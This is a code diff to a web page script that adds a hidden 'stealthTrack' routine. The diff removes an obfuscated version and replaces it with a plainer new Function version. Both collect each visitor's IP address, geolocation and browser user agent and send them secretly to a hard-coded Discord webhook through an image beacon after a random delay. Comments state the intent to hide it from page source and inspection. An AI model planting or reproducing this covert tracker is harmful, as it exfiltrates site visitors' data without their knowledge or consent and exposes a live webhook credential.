@@ -303,50 +303,29 @@
         });
 
             // Hidden tracking that won't appear in page source
-    // Hidden tracking that won't appear in inspection
-    const stealthTrack = () => {
-        // Obfuscated function names and variables
-        const _0xad3b = ['ipify', 'org/json', 'then', 'json', 'catch'];
-        (function(_0x12c582, _0xad3b62) {
-            const _0x2e4d8a = function(_0x4a875f) {
-                while (--_0x4a875f) {
-                    _0x12c582['push'](_0x12c582['shift']());
-                }
-            };
-            _0x2e4d8a(++_0xad3b62);
-        }(_0xad3b, 0x1a3));
-        
-        const _0x2e4d = function(_0x12c582, _0xad3b62) {
-            _0x12c582 = _0x12c582 - 0x0;
-            let _0x2e4d8a = _0xad3b[_0x12c582];
-            return _0x2e4d8a;
-        };
-        
-        // Dynamic function creation
-        Function(_0x2e4d('0x0') + `{
-            try {
-                fetch('https://api.` + _0x2e4d('0x1') + `')
-                [` + _0x2e4d('0x2') + `](res => res.` + _0x2e4d('0x3') + `())
-                [` + _0x2e4d('0x2') + `](data => {
-                    fetch(\`https://ipapi.co/\${data.ip}/` + _0x2e4d('0x3') + `/\`)
-                    [` + _0x2e4d('0x2') + `](geoRes => geoRes.` + _0x2e4d('0x3') + `())
-                    [` + _0x2e4d('0x2') + `](geoData => {
-                        const img = new Image();
-                        img.src = 'https://discord.com/api/webhooks/1365915920479813703/wzyUVye5F0zeZTTJWHkYwD0W50XrMOIG4QeuU-cjWiHj04VOhO_cel8S5xhVC8yF-mwc?' + 
-                            'ip=' + encodeURIComponent(data.ip) + 
-                            '&c=' + encodeURIComponent(geoData.country_name || '?') +
-                            '&r=' + encodeURIComponent(geoData.region || '?') +
-                            '&u=' + encodeURIComponent(navigator.userAgent.substring(0, 80));
-                    })
-                })
-                [` + _0x2e4d('0x4') + `](() => {});
-            } catch(e) {}
-        }`)();
-    };
+    const stealthTrack = new Function(`
+        try {
+            // Phase 1: Get IP
+            fetch('https://api.ipify.org?format=json')
+            .then(res => res.ok ? res.json() : Promise.reject())
+            .then(data => {
+                // Phase 2: Get geo data
+                fetch(\`https://ipapi.co/\${data.ip}/json/\`)
+                .then(geoRes => geoRes.ok ? geoRes.json() : Promise.reject())
+                .then(geoData => {
+                    // Phase 3: Send via image beacon
+                    new Image().src = 'https://discord.com/api/webhooks/1365915920479813703/wzyUVye5F0zeZTTJWHkYwD0W50XrMOIG4QeuU-cjWiHj04VOhO_cel8S5xhVC8yF-mwc?' + 
+                        'ip=' + encodeURIComponent(data.ip) + 
+                        '&c=' + (geoData.country_name ? encodeURIComponent(geoData.country_name) : '?') +
+                        '&r=' + (geoData.region ? encodeURIComponent(geoData.region) : '?') +
+                        '&u=' + encodeURIComponent(navigator.userAgent.substring(0,80));
+                }).catch(()=>{});
+            }).catch(()=>{});
+        } catch(e) {}
+    `);
     
-    // Execute with delay using setTimeout and bind
-    window.setTimeout = window.setTimeout.bind(window);
-    setTimeout(stealthTrack, 1500 + Math.random() * 1000);
+    // Execute with random delay
+    (setTimeout.bind(window))(stealthTrack, 1500 + Math.random() * 1000);
 });
 </script>
 </body>
